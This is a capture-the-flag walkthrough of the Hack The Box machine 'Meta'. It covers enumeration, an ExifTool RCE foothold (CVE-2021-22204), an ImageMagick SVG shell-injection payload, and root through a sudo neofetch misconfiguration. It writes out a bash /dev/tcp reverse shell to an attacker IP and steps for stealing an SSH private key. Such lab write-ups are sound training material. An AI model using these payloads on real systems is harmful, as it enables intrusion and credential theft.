---
description: 'Date: 03/26/22'
---

# Meta (Medium)

Port Scan: TCP SCAN: "nmap -sV -v 10.129.100.189"

* 22/tcp ssh OpenSSH 7.9p1
* 80/tcp http Apache httpd (no version given) -- Why can't I get the version? Wappalyzer did not detect it either. UDP SCAN: "nmap -sU -v 10.129.100.189"
* 68/udp open|filtered response dhcpc
* NMAP DHCP Enumeration Script usage:
* nmap -sU -p 68 --script=dhcp-discover 10.129.100.189
* nmap -sU -p 68 --script=broadcast-dhcp-discover 10.129.100.189
* nmap -sU -p 68 --script=broadcast-dhcp6-discover 10.129.100.189
* Result: Nothing

Visual Port 80 Webserver Enumeration:

* Navigated to 10.129.100.189 via URL search bar and could not connect to the server. However, artcorp.htb did pop up.
* Indicating a potential vhost? I added it to etc/hosts (10.129.100.189 artcorp.htb).
* Since adding the IP and domain to the hosts file, we can now access the site. Unique message on home page:
* "Development in progress: We are almost ready to launch our new product 'MetaView'. The product is already in testing phase. Stay tuned!"
* Team members include Judy E., Sarah W., and Thomas S.
* I did use view-source and analyzed website source code. Did not find anything too interesting other than elements causing "overflows" when I would use dev tools.

Dirbuster Scan:

* [http://10.129.100.189:80/](http://10.129.100.189/) Wordlists used: Dirbuster's medium.txt, directory-list-1.0.txt, Files/Directories Found:
* /index.php | Response Code: 301 Moved Permanently to[http://artcorp.htb](http://artcorp.htb) | Size: 176
* /server-status/ | Response Code: 403 Forbidden | Size: 351
* /.php | Response Code: 403 Forbidden | Size: 351
* /.hta | Response Code: 403 Forbidden | Size 199
* /.htpasswd | Response Code: 403 Forbidden | Size 199
* /.htaccess | Response Code: 403 Forbidden | Size 199
* /assets | Response Code: 301 Moved Permanently | Size 234
* Commands attempted to verify:
* Curl returned a 403 Forbidden
* wget returned a 403 Forbidden Dirsearch Scan:
* "dirsearch -u[http://10.129.100.189](http://10.129.100.189)"
* /index.php | 301 Moved Permanently to[http://artcorp.htb](http://artcorp.htb)
* /index.php/login/ | 301 Moved Permanently to[http://artcorp.htb](http://artcorp.htb)

Netcat Bannergrab:

* netcat -z -n -v 10.129.100.189 80
* (UNKNOWN) \[10.129.100.189] 80 (http) open
* \*At this point, I was starting to get frustrated. I thought "There must be another vhost, let's run a vhost scan with Gobuster." \*\*

Gobuster Vhost Scan:

* "gobuster vhost -u artcorp.htb -w /usr/share/dnsrecon/namelist.txt"
* Wordlist from SecLists via[https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
* Result:
* Found: dev01.artcorp.htb (Status: 200) \[Size: 247]
* Let's add dev01.artcorp.htb to our /etc/hosts file. dev01.artcorp.htb 10.129.100.189
* Upon navigating, we see "ArtCorp dev environment" "Currently applications in development" a link to an application named "MetaView" and below it, it says "\*Only applications ready to be tested are listed"
* When I clicked on the "MetaView" link, it redirects me to dev01.artcorp.htb/metaview/ and I see a File Upload page.
* This has to be where we can obtain our foothold!!!!!!
* Since we saw a lot of .php action above in our scans, can we use a Netcat listener and upload a php reverse shell here and gain access?
* At first, I attempted to use Pentest Monkey's PHP Reverse Shell ([https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)). Once I crafted it and started a Netcat listener, I ended up getting an error "File not allowed (only jpg/png).
* Obviously, we need to figure out how to bind a reverse shell to a picture file (jpg/png).
* In an attempt to bypass file extension sanitization, I tried to save the php-reverse-shell as a .png. This however, failed.
* Let's try to change the magic number of the file extension to FF D8 FF E0 at the start of the php-reverse-shell file using a hex tool. I used hexcurse (apt-get install hexcurse).\\
* I tried to upload this and still no shell, I however, ended up with a different error even though it did not work.
* Now, let's try to place a reverse shell into a photo's metadata. I found a Youtube video from Nullbyte where he uses ExifTool.
* None of my attempts worked. I even followed the entire video.
* However, I did notice when I tampered with the metadata of the image and placed my base64 encoded payload of the php reverse shell in it, I saw the string "ExifTool 12.16" in the output of the web app on MetaView.
* This output was also in a format that I recognized from the tool I just used in my own terminal window on my machine.
* This made me end up doing some research on ExifTool. There was a vulnerability discovered a few months ago that allows for RCE.
* This is CVE-2021-22204.

Foothold

* [https://github.com/AssassinUKG/CVE-2021-22204](https://github.com/AssassinUKG/CVE-2021-22204)
* This worked for me. I was able to start a Netcat listener on port 6969.
* The following syntax for the script/PoC that I found was:
* "bash [CVE-2021-22204.sh](http://cve-2021-22204.sh/) "reverseme 10.10.14.39 6969" istockphoto-868646936-612x612.jpg\_original" (istockphoto-868646936-612x612 is the name of the random picture of a penguin I downloaded on the Internet).
* I then went back to the MetaView webapp and uploaded this newly created image with the payload injected in it.
* Upon uploading, I go back to my Netcat listener and I GET A SHELL!!!
* Let's upgrade our shell!
* python3 -c 'import pty;pty.spawn("/bin/bash")'
* We then do a "cd /" to get to the root directory. However, when we go to /home, we see a username "thomas". Upon accessing this directory, we try to cat user.txt and get a permission denied.
* We must get become root or thomas to get access to this file.
* Privilege Escalation for User- Thomas:
  * I have linpeas on the target within /tmp.
  * A few things stood out but this did in particular.
  * I also may potentially have access to private ssh keys.
  * What is this? convert\_images.sh SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  * 3 /usr/sbin/CRON -f 2 /bin/sh -c cp -rp \~/conf/config\_neofetch.conf /home/thomas/.config/neofetch/config.conf 1 /usr/local/bin/mogrify -format png _._ 1 /bin/sh /sbin/dhclient-script 1 /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/\* 1 /bin/sh -c /usr/local/bin/convert\_images.sh 1 /bin/bash /usr/local/bin/convert\_images.sh
  * This convert\_images.sh file was the best lead I could find unfortunately. However, I started getting my hopes up again once I navigated to this file and cat'd the contents of it.
  * cat convert\_images.sh #!/bin/bash cd /var/www/dev01.artcorp.htb/convert\_images/ && /usr/local/bin/mogrify -format png _._ 2>/dev/null pkill mogrify
  * Upon analyzing, I thought to myself, why is it killing mogrify and what even is mogrify? Turns out a simple Google search shows that Mogrify has another alias of ImageMagick.
  * In a CTF, it often helps to consider the fact that a story is trying to be told or followed throughout the experience.
    * In our case on the website, the developers said that they develop tools for image media. Hence, Metaview, now ImageMagick. It seems to be following a trend.
    * Upon deeper inspection of the command above, I interpreted that convert\_images was where I needed to place an exploit because the binary mogrify would be formatting the file placed into convert\_images into a .png hence "-format png"
    * After discovering this, I figured that this must be our target.
  * I stumbled upon a site that features a shell injection vulnerability in ImageMagick.
    * [https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)
    * I then found a PoC for a file with a .svg extension.
    * PoC: -\<image authenticate='ff" `cat /dev/shm/shell.sh|bash`;"'> \<read filename="pdf:/etc/passwd"/> \<get width="base-width" height="base-height" /> \<resize geometry="400x400" /> \<write filename="test.png" /> \<svg width="700" height="700" xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)" xmlns:xlink="[http://www.w3.org/1999/xlink](http://www.w3.org/1999/xlink)"> \<image xlink:href="msl:poc.svg" height="100" width="100"/> \</svg> \</image>
    * The site says that it is critical to maintain the name poc.svg. However, I waited to transfer the file to convert\_images because the cron job script is running every few minutes and will delete the .svg and convert it into a .png and transfer it to dev/null. This will trigger the reverse shell but we need to get the reverse shell in the correct place first.
    * Once I did that, I set up a Netcat listener on port 1337.
      * "nc -lnvp 1337"
    * I then made a file named [shell.sh](http://shell.sh/)
      * [shell.sh](http://shell.sh/) contents:
        * \#!/bin/bash bash -c "sh -i >& /dev/tcp/10.10.15.74/1337 0>&1"|bash
    * On the target machine, I navigate to the /dev/shm/ and transferred [shell.sh](http://shell.sh/) here.
    * Lastly, transfer poc.svg to /var/www/dev01.artcorp.htb/convert\_images/
    * Wait a few minutes for the cron job script to execute automatically and then once the file is not in convert\_images anymore, check your Netcat listener with port 1337.
  * WE GET USER!!!!!!!!!!!!!!!!
    * Upgrade shell: python3 -c 'import pty;pty.spawn("/bin/bash")'
    * You now will have access to "thomas" a.k.a. user.
    * Cat out user.txt in his home directory.
  * I LEARNED SOMETHING BIG HERE:
    * Do a "ls -la" in his home directory.
    * You see .ssh right?
    * Navigate into it and cat out his id\_rsa and steal it (copy/paste).
    * Go back to your attack machine and place the contents of the key into a file named id\_rsa.
    * Now:
      * "ssh -i id\_rsa [thomas@10.129.100.189](mailto:thomas@10.129.100.189)"
      * Hit "yes" for fingerprint and it won't even ask you for a password.
      * You now have SSH credentials for Thomas. Keep in mind that SSH is a best-case-Scenario in terms of shell stability.

Privilege Escalation to Root:

* "sudo -l"
* env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env\_keep+=XDG\_CONFIG\_HOME

```
	  User thomas may run the following commands on meta:
		(root) NOPASSWD: /usr/bin/neofetch \\\\"\\\\"

- So I wanted to see if XDG_CONFIG_HOME was defined:
	"echo $XDG_CONFIG_HOME"
- The output will come back blank, confirming that this variable has not been defined yet. So, we can set it ourselves.
- "export XDG_CONFIG_HOME=/home/thomas/.config/
- I then nano'd into config.conf (this is in .config now)
- I then simply put "printf $(cat /root/root.txt) in the first element.
	- I put this right below "print_info() {"
	- Right above "info title"
	- Save the file.
	- Now, execute the one command that thomas is allowed to execute on this system:
		- sudo /usr/bin/neofetch \\\\"\\\\"
		- You will see the hash for root.txt has been displayed directly below the first line in the terminal.
		- ROOOOOOOOOT
```

* Note: This was a lazier way to do this because of CTF purposes).
  * You could have placed a reverse shell where printf $(cat /root/root.txt) is and saved it.
  * Then execute sudo /usr/bin/neofetch \\"\\"
